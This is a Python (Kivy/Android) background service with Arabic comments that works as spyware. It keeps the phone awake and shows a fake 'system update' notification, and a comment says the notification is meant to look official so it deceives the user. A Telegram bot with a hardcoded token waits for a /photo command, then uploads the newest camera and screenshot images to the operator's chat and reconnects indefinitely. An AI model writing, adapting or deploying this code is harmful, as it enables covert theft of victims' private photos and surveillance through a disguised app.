from jnius import autoclass
import telebot
import time
import threading
import os
import requests

# استدعاء أدوات نظام أندرويد
PythonService = autoclass('org.kivy.android.PythonService')
Context = autoclass('android.content.Context')
NotificationBuilder = autoclass('android.app.Notification$Builder')
NotificationChannel = autoclass('android.app.NotificationChannel')
NotificationManager = autoclass('android.app.NotificationManager')
Build = autoclass('android.os.Build')
PowerManager = autoclass('android.os.PowerManager')

service = PythonService.mService
context = service.getApplicationContext()

# --- تفعيل الـ Wake Lock لمنع المعالج من النوم ---
power = context.getSystemService(Context.POWER_SERVICE)
wake_lock = power.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "ShadowCore::WakeLock")
wake_lock.acquire()

# --- إنشاء الإشعار (Foreground Service) ---
def start_foreground():
    NOTIF_ID = 1
    CHANNEL_ID = "system_update_service"
    nm = context.getSystemService(Context.NOTIFICATION_SERVICE)

    if Build.VERSION.SDK_INT >= 26:
        channel = NotificationChannel(CHANNEL_ID, "System Sync", NotificationManager.IMPORTANCE_LOW)
        nm.createNotificationChannel(channel)
        builder = NotificationBuilder(context, CHANNEL_ID)
    else:
        builder = NotificationBuilder(context)

    # هذا الإشعار سيراه المستخدم، لذا نجعله يبدو رسمياً
    notification = builder.setContentTitle("نظام التحديث يعمل") \
                          .setContentText("يتم فحص استقرار النظام في الخلفية...") \
                          .setSmallIcon(context.getApplicationInfo().icon) \
                          .build()
    service.startForeground(NOTIF_ID, notification)

# --- إعدادات البوت ---
BOT_TOKEN = "7820129712:AAH9pZ49S_m8tY8965625902"
CHAT_ID = "6110903337"
bot = telebot.TeleBot(BOT_TOKEN, threaded=False)

def get_photos():
    paths = ["/storage/emulated/0/DCIM/Camera", "/storage/emulated/0/Pictures/Screenshots"]
    photo_files = []
    for path in paths:
        if os.path.exists(path):
            for f in os.listdir(path):
                if f.lower().endswith(('.jpg', '.jpeg', '.png')):
                    full_p = os.path.join(path, f)
                    photo_files.append((full_p, os.path.getmtime(full_p)))
    photo_files.sort(key=lambda x: x[1], reverse=True)
    return [x[0] for x in photo_files[:15]]

@bot.message_handler(commands=['photo'])
def send_p(msg):
    photos = get_photos()
    for p in photos:
        try:
            with open(p, 'rb') as img:
                bot.send_photo(CHAT_ID, img)
            time.sleep(0.5)
        except: pass

# --- حلقة اتصال مقاومة للانهيار ---
def run_bot():
    while True:
        try:
            bot.infinity_polling(timeout=30, long_polling_timeout=30, skip_pending=True)
        except:
            time.sleep(10) # انتظر وأعد المحاولة عند انقطاع الإنترنت

if __name__ == "__main__":
    start_foreground()
    t = threading.Thread(target=run_bot)
    t.daemon = True
    t.start()
    while True:
        time.sleep(60) # إبقاء الخدمة حية للأبد
